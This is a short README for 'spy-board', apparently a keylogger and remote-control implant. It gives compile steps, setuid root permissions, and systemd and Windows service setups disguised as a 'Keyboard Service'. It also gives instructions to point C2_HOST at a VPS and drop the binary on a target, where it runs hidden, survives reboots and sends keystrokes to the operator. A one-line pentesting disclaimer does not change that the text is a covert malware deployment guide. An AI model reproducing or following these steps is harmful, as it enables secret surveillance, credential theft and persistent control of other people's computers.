in this app spy-board it uses native c to run attacks through a remote server to control the host 
this app must not be used in any bad way it is meant for pentesting

how to run 
in linux
gcc -o client client.c -pthread
sudo chown root client
sudo chmod +s client

 Systemd Service (Linux) - /etc/systemd/system/keyboard.service
[Unit]
Description=Keyboard Service
After=network.target

[Service]
Type=forking
ExecStart=/path/to/server
Restart=always
RestartSec=5
User=root
KillMode=process

[Install]
WantedBy=multi-user.target

bash
sudo systemctl daemon-reload
sudo systemctl enable keyboard.service
sudo systemctl start keyboard.service

Windows Service Wrapper - install_service.bat
sc create KeyboardService binPath= "C:\Windows\server.exe" start= auto
sc start KeyboardService

compilation
gcc -mwindows -lws2_32 -o server.exe client.c

Deployment Workflow
Change C2_HOST in both server files to your VPS IP
Compile:

Windows: gcc -mwindows -lws2_32 -o server.exe server_win.c
Linux:   gcc -o server server_linux.c -pthread && sudo chmod +s server

Deploy:

Windows: Drop server.exe → Runs hidden + autorun
Linux:   Drop server → sudo systemctl start keyboard

C2: ./client → "Target connected" → Type on target → Keys appear

Windows: tasklist | findstr server   → Nothing
Linux:   ps aux | grep server       → PID 1 child only
Both:    Reboot → Auto-reconnects




